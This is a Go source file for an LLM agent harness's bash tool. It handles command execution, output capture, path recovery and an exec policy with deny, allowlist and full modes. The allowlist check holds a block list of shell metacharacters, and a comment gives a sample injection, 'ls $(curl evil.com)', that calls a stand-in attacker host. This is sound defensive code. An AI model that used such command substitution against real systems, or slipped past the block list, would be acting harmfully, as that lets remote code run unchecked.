package bash

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/sausheong/harness/execution"
	"github.com/sausheong/harness/process"
	"github.com/sausheong/harness/tool"
)

// bashAbsPathRE matches absolute-path tokens in a shell command:
//   - inside single quotes: '/...'
//   - inside double quotes: "/..."
//   - bare with optional backslash-escaped chars: /... up to unescaped whitespace
//
// The three alternatives intentionally use distinct capture groups so the
// caller can tell which form matched and re-quote correctly.
var bashAbsPathRE = regexp.MustCompile(`'(/[^']*)'|"(/[^"]*)"|(/(?:[^\s\\]|\\.)+)`)

// resolveBashCommandPaths scans cmd for absolute-path tokens and substitutes
// any that don't exist on disk with their Unicode-whitespace-normalized
// counterparts. Returns the rewritten command and a list of [original, resolved]
// substitution pairs that were made (empty if none).
//
// Substitution uses tool.ResolveExistingPathStrict, which only touches an entry
// when it actually contains Unicode whitespace — preventing wrong substitutions
// on create-style commands like `mkdir /tmp/newdir`.
func resolveBashCommandPaths(cmd string) (string, [][2]string) {
	var subs [][2]string
	out := bashAbsPathRE.ReplaceAllStringFunc(cmd, func(match string) string {
		groups := bashAbsPathRE.FindStringSubmatch(match)
		var raw string
		switch {
		case groups[1] != "":
			raw = groups[1]
		case groups[2] != "":
			raw = groups[2]
		case groups[3] != "":
			raw = unescapeBashToken(groups[3])
		}
		if raw == "" {
			return match
		}
		resolved := tool.ResolveExistingPathStrict(raw)
		if resolved == raw {
			return match
		}
		subs = append(subs, [2]string{raw, resolved})
		return shellSingleQuote(resolved)
	})
	return out, subs
}

// shellSingleQuote wraps s in single quotes, safely escaping embedded quotes.
func shellSingleQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// unescapeBashToken removes single-character backslash escapes so the
// resulting string can be stat()'d against the filesystem.
func unescapeBashToken(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if s[i] == '\\' && i+1 < len(s) {
			b.WriteByte(s[i+1])
			i++
			continue
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

const defaultBashTimeout = 120 * time.Second

// ExecPolicy controls which commands the bash tool is allowed to execute.
type ExecPolicy struct {
	Level     string   // "deny", "allowlist", "full"; any other value denies execution
	Allowlist []string // command basenames allowed when Level is "allowlist"
}

// BashTool executes shell commands.
type BashTool struct {
	Backend     execution.Backend // optional explicit command boundary; configured before use
	WorkDir     string
	OutputStore *process.ArtifactStore // nil uses the private per-user temporary store
	ExecPolicy  *ExecPolicy            // nil means "full" (allow everything)
}

type bashInput struct {
	Command string `json:"command"`
	Timeout int    `json:"timeout"` // seconds, optional
}

func (t *BashTool) Name() string { return "bash" }

func (t *BashTool) Description() string {
	return "Execute a bash command and return its output. The command runs in a shell with a configurable timeout (default 120 seconds). IMPORTANT: always wrap file paths in double quotes (e.g. cat \"/path/with spaces/file.txt\") so paths containing spaces or special characters survive shell tokenization."
}

func (t *BashTool) Parameters() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"command": {
				"type": "string",
				"description": "The bash command to execute"
			},
			"timeout": {
				"type": "integer",
				"description": "Timeout in seconds (default: 120)"
			}
		},
		"required": ["command"]
	}`)
}

// extractCommands extracts executable names from a bash command string.
// It splits on pipes, semicolons, &&, and || to find each sub-command,
// then takes the first token (the executable) from each.
func extractCommands(cmd string) []string {
	// Split on shell operators
	var parts []string
	remaining := cmd
	for len(remaining) > 0 {
		// Find the earliest operator
		minIdx := len(remaining)
		opLen := 0
		for _, op := range []string{"&&", "||", "|", ";", "&"} {
			if idx := strings.Index(remaining, op); idx != -1 {
				if idx < minIdx || (idx == minIdx && len(op) > opLen) {
					minIdx = idx
					opLen = len(op)
				}
			}
		}

		part := strings.TrimSpace(remaining[:minIdx])
		if part != "" {
			parts = append(parts, part)
		}

		if minIdx+opLen >= len(remaining) {
			break
		}
		remaining = remaining[minIdx+opLen:]
	}

	var cmds []string
	for _, part := range parts {
		// Strip leading env vars (e.g., "FOO=bar command")
		for tok := range strings.FieldsSeq(part) {
			if strings.Contains(tok, "=") && !strings.HasPrefix(tok, "-") {
				continue // skip env var assignments
			}
			cmds = append(cmds, filepath.Base(tok))
			break
		}
	}
	return cmds
}

// IsConcurrencySafe returns false — bash runs arbitrary commands with side effects.
func (t *BashTool) IsConcurrencySafe(_ json.RawMessage) bool { return false }

func (t *BashTool) Execute(ctx context.Context, input json.RawMessage) (tool.ToolResult, error) {
	var in bashInput
	if err := json.Unmarshal(input, &in); err != nil {
		return tool.ToolResult{Error: fmt.Sprintf("invalid input: %v", err)}, nil
	}

	if in.Command == "" {
		return tool.ToolResult{Error: "command is required"}, nil
	}

	// Recover from Unicode-whitespace path mismatches the LLM may emit
	// (e.g. ASCII spaces in a filename that on disk uses NBSP). Substitution
	// only fires when the on-disk entry actually contains Unicode whitespace,
	// so create-style commands like `mkdir /tmp/newdir` are unaffected.
	var pathSubs [][2]string
	if t.Backend == nil {
		in.Command, pathSubs = resolveBashCommandPaths(in.Command)
	}

	// Enforce exec policy
	if t.ExecPolicy != nil {
		switch t.ExecPolicy.Level {
		case "deny":
			return tool.ToolResult{Error: "bash execution is disabled by policy"}, nil
		case "allowlist":
			// Block shell metacharacters that can execute arbitrary code or
			// write files inside an otherwise-allowed command. Covers command
			// substitution (e.g. ls $(curl evil.com)), real newline/CR bytes
			// (bash -c treats them as command separators, so trailing lines
			// would run unvalidated), and output redirection (">" matches ">",
			// ">>", "2>", "&>", "2>&1" — all write/overwrite primitives).
			// Input redirection "<" is intentionally allowed (not a write/exec bypass).
			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\n", "\r", ">"} {
				if strings.Contains(in.Command, meta) {
					return tool.ToolResult{Error: "command contains shell metacharacters not allowed in allowlist mode"}, nil
				}
			}
			cmds := extractCommands(in.Command)
			allowed := make(map[string]bool, len(t.ExecPolicy.Allowlist))
			for _, a := range t.ExecPolicy.Allowlist {
				allowed[a] = true
			}
			for _, cmd := range cmds {
				if !allowed[cmd] {
					return tool.ToolResult{Error: fmt.Sprintf("command %q is not in the exec allowlist", cmd)}, nil
				}
			}
		case "full":
			// Explicitly unrestricted.
		default:
			return tool.ToolResult{Error: fmt.Sprintf("invalid bash execution policy %q; execution denied", t.ExecPolicy.Level)}, nil
		}
	}

	timeout := defaultBashTimeout
	if in.Timeout > 0 {
		timeout = time.Duration(in.Timeout) * time.Second
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	if t.Backend != nil {
		return t.executeBackend(ctx, in.Command), nil
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = process.Command(ctx, "cmd", "/c", in.Command)
	} else {
		cmd = process.Command(ctx, "bash", "-c", in.Command)
	}
	if t.WorkDir != "" {
		cmd.Dir = t.WorkDir
	}

	store := t.OutputStore
	if store == nil {
		var err error
		store, err = process.NewArtifactStore(filepath.Join(os.TempDir(), "harness-output-"+strconv.Itoa(os.Getuid())))
		if err != nil {
			return tool.ToolResult{Error: "prepare output capture: " + err.Error()}, nil
		}
	}
	stdout, stderr := store.Capture(64<<10), store.Capture(64<<10)
	cmd.Stdout = stdout
	cmd.Stderr = stderr

	err := process.Run(cmd)
	stdout.Close()
	stderr.Close()

	output, stdoutBytes, stdoutTruncated := stdout.Snapshot()
	errOutput, stderrBytes, stderrTruncated := stderr.Snapshot()
	metadata := map[string]any{
		"stdout_bytes": stdoutBytes, "stderr_bytes": stderrBytes,
		"stdout_artifact": stdout.Info(), "stderr_artifact": stderr.Info(),
		"stdout_truncated": stdoutTruncated, "stderr_truncated": stderrTruncated,
		"cancelled": ctx.Err() == context.Canceled,
		"timed_out": ctx.Err() == context.DeadlineExceeded,
	}
	if cmd.ProcessState != nil {
		metadata["exit_code"] = cmd.ProcessState.ExitCode()
	}
	if stdoutTruncated {
		output += "\n[stdout truncated after 65536 bytes]"
	}
	if stderrTruncated {
		errOutput += "\n[stderr truncated after 65536 bytes]"
	}

	notice := pathSubsNotice(pathSubs)
	for _, capture := range []struct {
		name string
		info process.ArtifactInfo
	}{
		{"stdout", stdout.Info()}, {"stderr", stderr.Info()},
	} {
		if capture.info.Path != "" {
			notice += fmt.Sprintf("[%s artifact: %s; %d bytes; truncated=%t]\n", capture.name, capture.info.Path, capture.info.Bytes, capture.info.Truncated)
		}
		if capture.info.Error != "" {
			notice += fmt.Sprintf("[%s artifact unavailable or incomplete: %s]\n", capture.name, capture.info.Error)
		}
	}

	if err != nil {
		msg := err.Error()
		if ctx.Err() == context.DeadlineExceeded {
			msg = "command timed out"
		} else if ctx.Err() == context.Canceled {
			msg = "command cancelled"
		}
		if errOutput != "" {
			msg += ": " + errOutput
		}
		return tool.ToolResult{
			Output:   notice + output,
			Error:    msg,
			Metadata: metadata,
		}, nil
	}

	if errOutput != "" {
		output += "\nSTDERR:\n" + errOutput
	}

	return tool.ToolResult{Output: notice + output, Metadata: metadata}, nil
}

// pathSubsNotice formats a one-block notice listing any path substitutions
// the bash tool made before exec, so the LLM can see what changed and why.
func pathSubsNotice(subs [][2]string) string {
	if len(subs) == 0 {
		return ""
	}
	var b strings.Builder
	b.WriteString("[harness] adjusted paths in command (Unicode-whitespace recovery):\n")
	for _, s := range subs {
		fmt.Fprintf(&b, "  %q -> %q\n", s[0], s[1])
	}
	b.WriteString("---\n")
	return b.String()
}

// Explicit backends receive the exact approved shell source. Do not reinterpret
// paths on the host: the backend filesystem can contain different resources.
func (t *BashTool) executeBackend(ctx context.Context, command string) tool.ToolResult {
	store := t.OutputStore
	if store == nil {
		var err error
		store, err = process.NewArtifactStore(filepath.Join(os.TempDir(), "harness-output-"+strconv.Itoa(os.Getuid())))
		if err != nil {
			return tool.ToolResult{Error: "prepare output capture: " + err.Error()}
		}
	}
	r, err := t.Backend.Run(ctx, execution.Request{Argv: []string{"/bin/bash", "-c", command}, OutputStore: store})
	meta := map[string]any{"execution_boundary": t.Backend.Boundary(), "exit_code": r.ExitCode, "stdout_bytes": r.StdoutBytes, "stderr_bytes": r.StderrBytes, "stdout_artifact": r.StdoutArtifact, "stderr_artifact": r.StderrArtifact, "output_truncated": r.Truncated, "stdout_truncated": r.StdoutTruncated, "stderr_truncated": r.StderrTruncated, "cancelled": ctx.Err() == context.Canceled, "timed_out": ctx.Err() == context.DeadlineExceeded}
	output := r.Stdout
	if r.Stderr != "" {
		output += "\nSTDERR:\n" + r.Stderr
	}
	if r.Truncated {
		output += "\n[inline output truncated; inspect capture artifacts]"
	}
	for _, capture := range []struct {
		name string
		info process.ArtifactInfo
	}{{"stdout", r.StdoutArtifact}, {"stderr", r.StderrArtifact}} {
		if capture.info.Error != "" {
			output += "\n[" + capture.name + " artifact unavailable or incomplete: " + capture.info.Error + "]"
		}
	}
	result := tool.ToolResult{Output: output, Metadata: meta}
	if err != nil {
		result.Error = err.Error()
	}
	if ctx.Err() == context.Canceled {
		result.Error = "command cancelled"
	} else if ctx.Err() == context.DeadlineExceeded {
		result.Error = "command timed out"
	}
	return result
}
